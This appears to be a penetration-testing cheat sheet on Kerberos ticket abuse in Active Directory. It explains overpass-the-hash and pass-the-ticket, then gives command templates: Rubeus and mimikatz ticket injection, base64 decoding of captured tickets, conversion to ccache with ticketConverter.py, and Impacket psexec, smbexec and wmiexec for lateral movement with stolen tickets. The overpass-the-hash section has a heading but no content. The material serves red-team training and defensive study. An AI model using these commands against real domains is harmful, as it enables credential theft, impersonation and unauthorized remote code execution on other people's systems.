# Active Directory - Kerberos tickets usage

### Overview

`Kerberos` is an authentication protocol used within Active Directory that rely
on the use of tickets to identify users and grant access to domain resources.
To do so, `Kerberos` implements two type of tickets, issued by two distinct
services of the `Key Distribution Center (KDC)`:
  - `Ticket-Granting Ticket (TGT)`, obtained from the `Authentication Service
  (AS)`.
  - `service tickets`, obtained from the `Ticket-Granting Service (TGS)`.

A valid `TGT` is necessary in order to request `service tickets`, which in turn
grant access to service accounts (user or machine domain accounts that have a
`ServicePrincipalName (SPN)`).

`Overpass-the-hash` is the action of using the `NTLM` hash of an user to
request a `Kerberos` `TGT`. The `NTLM` hash is injected in the `MSV1_0` and
`Kerberos` service providers, in place of the account `RC4` secret (whose
values are identical), to obtain a `TGT` from the `KDC`.

`Pass-the-ticket (PtT)` is the action of directly using `Kerberos` tickets
(`TGTs` or `service tickets`) with out a request to the `KDC`. On Windows
systems, the tickets can be directly injected in the current logon session
while on Linux systems `Kerberos` tickets file can be provided to utilities
supporting the `Kerberos` authentication.

### Overpass-the-hash / Pass The Key (PTK)

### Pass-the-ticket (PtT)

###### [Windows / Linux] Direct requests of service tickets

On Windows, the `Rubeus`'s `asktgs` module can can be used to request
`service tickets` using a valid `TGT`:

```
# ptt: Directly injects the received service ticket in the current logon session

Rubeus.exe asktgs /ticket:<TGT_BASE64 | TGT_KIRBI_FILE_PATH> /service:<TARGET_SERVICE_SPN | TARGET_SERVICES_SPN> /ptt
```

###### [Windows] Injection into the current session

`Kerberos` tickets, in the credential format `KRB_CRED` (`KIRBI` file), can be
injected into the current logon session using `mimikatz` or `Rubeus`:

```
# If necessary, decodes a ticket in base64 (from Rubeus for example) to the KRB_CRED format.
cat <TICKET_BASE64_FILE_PATH> | tr -d "[:space:]" | base64 --decode > <TICKET_KIRBI_FILE_PATH>

# Injects into memory a ticket in the KRB_CRED format.
Rubeus.exe ptt /ticket:<TICKET_KIRBI_FILE_PATH>
mimikatz.exe "kerberos::ptt <TICKET_KIRBI_FILE_PATH>" exit
```

The `Kerberos` tickets cached in the current logon session can be listed using
the Windows built-in `klist` utility or `Rubeus`'s `klist` module:

```
klist

Rubeus.exe klist
```

###### [Linux] credential cache (ccache)

`Kerberos` tickets can be converted from the `KRB_CRED` format to the
`credential cache (ccache)` format to be used with, among others, the
`Impacket`'s Python utilities. If a `TGT` is provided, the `Impacket`'s
utilities will try to obtain the necessary service tickets through request to
the `KDC`.

Refer to the `[Windows] Lateral movements` for more information on how to
leverage the `Impacket` suite for lateral movements in a Windows environment.

```
# If necessary, decodes a ticket in base64 (from Rubeus for example) to the KRB_CRED format.
cat <TICKET_BASE64_FILE_PATH> | tr -d "[:space:]" | base64 --decode > <TICKET_KIRBI_FILE_PATH>

# Converts the TGT from KRB_CRED to ccache.
ticketConverter.py  <TICKET_KIRBI_FILE_PATH> <TICKET_CCACHE_FILE_PATH>

export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>

# Usage of the TGT through Impacket's utilities.
psexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
smbexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
wmiexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
[...]
```
